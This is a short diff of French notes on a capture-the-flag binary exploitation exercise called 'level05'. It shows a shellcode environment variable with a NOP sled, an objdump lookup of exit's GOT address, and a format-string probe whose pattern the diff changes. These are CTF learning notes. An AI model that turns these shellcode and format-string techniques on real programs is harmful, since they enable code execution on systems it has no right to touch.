@@ -2,7 +2,7 @@ export SHELLCODE=$(python -c 'print("\x90" * 100 + "\x31\xc0\x31\xdb\x31\xc9\x31
 
 objdump level05 -R  pour avoirl adresse d exit
 
-python -c 'print("aaaa" + "%x " * 50 )' | ./level05
+python -c 'print("aaaa " + "bbbb "  + "%x " * 50 )' | ./level05
 
 on va passer nos 2 adresse de buffera la 10 eme et 11 eme place de notre string exploit
 
